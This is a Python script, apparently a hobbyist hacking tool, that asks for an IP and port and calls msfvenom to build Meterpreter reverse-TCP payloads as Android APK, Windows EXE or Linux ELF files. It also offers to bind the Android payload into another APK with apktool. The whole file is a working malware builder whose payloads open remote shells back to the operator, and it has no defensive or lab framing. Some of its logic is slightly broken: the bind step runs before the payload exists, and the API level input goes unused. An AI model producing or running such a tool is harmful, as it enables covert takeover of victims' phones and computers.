import os
import logging
import subprocess
import sys
import time
import socket
from pyfiglet import Figlet

# Create a custom Figlet font
custom_figlet = Figlet(font="block")

# Set up the logging system
logging.basicConfig(filename="payload_generator.log", level=logging.INFO, format="%(asctime)s - %(levelname)s: %(message)s")
log = logging.getLogger("payload_generator")

# Function to create the "Payloads" folder if it doesn't exist
def create_payloads_folder():
    if not os.path.exists("Payloads"):
        os.makedirs("Payloads")

# Function to execute a command and capture the output
def execute_command(command, verbose=False):
    try:
        if verbose:
            print(f"Executing command: {command}")
        result = subprocess.run(command, shell=True, text=True, capture_output=True, check=True)
        return result.stdout
    except subprocess.CalledProcessError as e:
        error_message = f"Error executing command: {e.stderr}"
        log.error(error_message)
        return error_message

# Function to generate payloads
def generate_payload(ip, port, payload_type, android_api_level=None, bind=False, bind_file=None, verbose=False):
    try:
        if not ip or not port:
            raise ValueError("IP address and port are required.")
        
        # Check if the IP is a valid IPv4 address
        try:
            socket.inet_aton(ip)
        except socket.error:
            raise ValueError("Invalid IP address. Please provide a valid IPv4 address.")

        # Check if the port is a valid integer in the range [1, 65535]
        try:
            port = int(port)
            if not (1 <= port <= 65535):
                raise ValueError("Port number is out of range.")
        except ValueError:
            raise ValueError("Invalid port number. Please provide a valid integer in the range [1, 65535].")

        if payload_type not in ["android", "windows", "linux"]:
            raise ValueError("Unsupported payload type.")

        if payload_type == "android":
            if not android_api_level:
                raise ValueError("Android API level is required for Android payloads.")

            output_file = f"Payloads/payload.apk"
            payload_command = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file} --platform android -a dalvik"

        elif payload_type == "windows":
            output_file = f"Payloads/payload.exe"
            payload_command = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        elif payload_type == "linux":
            output_file = f"Payloads/payload.elf"
            payload_command = f"msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={ip} LPORT={port} -o {output_file}"

        create_payloads_folder()

        if bind:
            if not bind_file:
                raise ValueError("Binding file path is required.")
            
            if payload_type == "android":
                output_file = f"Payloads/bind_payload.apk"
                binding_command = f"apktool b {output_file} -o {output_file} -f {bind_file}"
                bind_output = execute_command(binding_command, verbose)
                if "Exception" in bind_output:
                    raise Exception(f"Binding failed: {bind_output}")
            else:
                raise ValueError("Binding is not supported for non-Android payloads.")

        payload_output = execute_command(payload_command, verbose)
        if "Exception" in payload_output:
            raise Exception(f"Payload generation failed: {payload_output}")

        success_message = f"{payload_type.capitalize()} payload generated successfully as '{output_file}'{' (and bound)' if bind else ''}"
        log.info(success_message)
        return success_message
    except Exception as e:
        log.error(str(e))
        return str(e)

if __name__ == "__main__":
    verbose = False  # Set this to False to suppress the animation and command execution messages

    # Background color codes
    BG_YELLOW = "\033[43m"
    BG_RESET = "\033[0m"

    print("\033[93m")
    print(custom_figlet.renderText("Payload Generator"))
    print("\033[0m")

    # Ask for IP address and port with colored background
    print(f"{BG_YELLOW}Enter your IP address: {BG_RESET}", end=" ")
    ip = input()
    print(f"{BG_YELLOW}Enter the port: {BG_RESET}", end=" ")
    port = input()

    print("\033[96m")
    print("Select payload type:")
    print("1. Android")
    print("2. Windows")
    print("3. Linux")
    print("\033[0m")
    choice = input("Enter the number of your choice: ")

    if choice == "1":
        payload_type = "android"
    elif choice == "2":
        payload_type = "windows"
    elif choice == "3":
        payload_type = "linux"
    else:
        print("\033[91m")
        print("Invalid choice. Please choose a valid payload type.")
        print("\033[0m")
        exit()

    android_api_level = input("Enter Android API level (e.g., 33 for Android 13, or leave empty for other platforms): ")

    bind = input("Do you want to bind payloads? (yes or no): ").strip().lower() == "yes"
    bind_file = input("Enter the path to the file you want to bind (leave empty if not binding): ").strip()

    result = generate_payload(ip, port, payload_type, android_api_level, bind, bind_file, verbose=verbose)
    print("\033[92m")
    print(result)
    print("\033[0m")
